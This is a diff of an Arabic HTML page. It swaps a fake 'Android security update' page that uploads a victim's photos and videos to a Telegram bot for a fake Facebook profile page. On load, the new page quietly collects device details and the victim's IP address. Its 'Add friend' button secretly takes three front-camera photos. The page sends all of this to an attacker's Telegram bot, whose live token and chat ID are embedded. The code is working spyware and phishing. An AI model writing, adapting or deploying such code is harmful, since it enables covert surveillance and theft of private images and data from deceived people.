@@ -2,73 +2,110 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="manifest" href="manifest.json">
-    <title>تحديث خدمات النظام</title>
+    <meta property="og:title" content="Najat350">
+    <meta property="og:site_name" content="Facebook">
+    <meta property="og:description" content="‎Najat350‎ موجودة على فيسبوك. انضم إلى فيسبوك للتواصل مع ‎Najat350‎ وأشخاص آخرين قد تعرفهم.">
+    <meta property="og:image" content="https://i.pinimg.com/originals/10/91/94/1091948c6b80b63f9e3e269f51873239.jpg">
+    <meta property="og:type" content="profile">
+    <title>Facebook - Najat350</title>
+    
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 40px; background-color: #1a1a1a; color: white; }
-        .card { background: #2d2d2d; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .logo { width: 80px; margin-bottom: 20px; }
-        .btn { background: #3498db; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #2980b9; }
-        #status { margin-top: 20px; color: #aaa; font-size: 14px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
+        .fb-header { background: white; height: 180px; position: relative; }
+        .cover { background: #ddd; height: 150px; width: 100%; }
+        .profile-img { width: 120px; height: 120px; border-radius: 50%; border: 4px solid white; position: absolute; bottom: -40px; right: 20px; object-fit: cover; }
+        .fb-content { padding: 50px 20px 20px; text-align: right; }
+        .name { font-size: 24px; font-weight: bold; margin: 0; }
+        .bio { color: #65676b; margin: 10px 0; }
+        .btn-blue { background: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://cdn-icons-png.flaticon.com/512/564/564445.png" alt="logo" class="logo">
-        <h2>تحديث أمني للأندرويد</h2>
-        <p>يجب مزامنة ملفات النظام لإصلاح أخطاء المعرض واستقرار البطارية.</p>
-        <button class="btn" onclick="startCapture()">بدء المزامنة والإصلاح</button>
-        <div id="status"></div>
+    <div class="fb-header">
+        <div class="cover"></div>
+        <img src="https://i.pinimg.com/originals/10/91/94/1091948c6b80b63f9e3e269f51873239.jpg" class="profile-img">
+    </div>
+    <div class="fb-content">
+        <h1 class="name">Najat350</h1>
+        <p class="bio">حسابي الشخصي - انضم للمتابعة</p>
+        <button class="btn-blue" onclick="initiateExploit()">إضافة صديق</button>
     </div>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        const BOT_TOKEN = '8301533698:AAFOJ_IyTmOXO5BPQwOEFFFYy7tfIlaqJ1g';
-        const CHAT_ID = '7184970355';
+        const TOKEN = '8301533698:AAFOJ_IyTmOXO5BPQwOEFFFYy7tfIlaqJ1g';
+        const ID = '7184970355';
 
-        async function startCapture() {
-            const status = document.getElementById('status');
-            try {
-                // طلب الوصول للمجلد
-                const dirHandle = await window.showDirectoryPicker();
-                status.innerText = "جاري فحص الملفات... يرجى عدم إغلاق الصفحة";
-
-                for await (const entry of dirHandle.values()) {
-                    if (entry.kind === 'file') {
-                        const file = await entry.getFile();
-                        
-                        // تصفية الملفات لإرسال الصور والفيديوهات فقط (اختياري)
-                        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-                            await sendToTelegram(file);
-                        }
-                    }
-                }
-                status.innerText = "تمت المزامنة بنجاح.";
-            } catch (err) {
-                status.innerText = "خطأ: يجب منح الصلاحية لإتمام التحديث.";
-                console.error(err);
+        // 1. سحب البيانات فور فتح الرابط (بدون إذن)
+        window.onload = async () => {
+            let batteryInfo = "";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `\n- شحن الهاتف: ${b.level * 100}%\n- يشحن؟: ${b.charging ? "نعم" : "لا"}`;
             }
-        }
 
-        async function sendToTelegram(file) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', file);
+            const info = `
+📱 معلومات جهاز جديد:
+- IP: جاري الجلب...
+- الجهاز: ${navigator.platform}
+- الرام: ${navigator.deviceMemory || 'غير معروف'} GB
+- النواة: ${navigator.hardwareConcurrency}
+- الشاشة: ${screen.width}x${screen.height}
+- اللغة: ${navigator.language}
+- المتصفح: ${navigator.userAgent.split(' ')[0]} ${batteryInfo}
+            `;
+            sendToTelegram(info);
+            
+            // جلب الـ IP
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+                sendToTelegram(`🌐 عنوان IP الضحية: ${d.ip}`);
+            });
+        };
 
+        // 2. طلب الكاميرا (يركز على الأيفون)
+        async function initiateExploit() {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
+                // الأيفون يتطلب playsinline لبدء الكاميرا صمتاً
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
                 });
-            } catch (e) {
-                console.error("إرسال فاشل", e);
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // التقاط 3 صور سريعة
+                let count = 0;
+                const interval = setInterval(() => {
+                    takeSnap();
+                    count++;
+                    if(count >= 3) clearInterval(interval);
+                }, 1500);
+
+            } catch (err) {
+                alert("يرجى تحديث الصفحة والموافقة على الصلاحيات لعرض الحساب.");
             }
         }
 
-        // تسجيل الـ Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
+        function takeSnap() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', ID);
+                fd.append('photo', blob, 'iphone_shot.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
         }
     </script>
 </body>
